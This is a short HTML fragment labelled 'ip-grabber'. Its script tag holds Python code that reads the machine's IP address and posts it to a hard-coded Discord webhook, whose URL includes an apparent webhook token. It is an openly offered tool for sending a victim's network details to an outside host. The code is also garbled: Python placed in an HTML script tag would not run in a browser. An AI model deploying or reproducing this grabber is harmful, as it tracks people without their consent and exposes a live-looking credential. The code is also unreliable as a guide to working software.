  <body>
    <div id="ip-grabber">
        <script>
import requests
import socket

WEBHOOK_URL = 'https://discord.com/api/webhooks/1084024489802747934/dyX_Nxud0eoiH8HWgaFZCBZsmyBZM4D6tTcGuL9_NPf5vyQ7T0K4PTJMJ8zQPLZvDhXd'

def post_to_webhook(message):
    data = {
        'content': message
    }
    requests.post(WEBHOOK_URL, json=data)

def get_ip():
    return socket.gethostbyname(socket.gethostname())

if __name__ == '__main__':
    try:
        ip = get_ip()
        post_to_webhook('The IP address is: {}'.format(ip))
        print('IP posted to Discord webhook')
    except Exception as e:
        print('An error occurred: {}'.format(e))
</script>
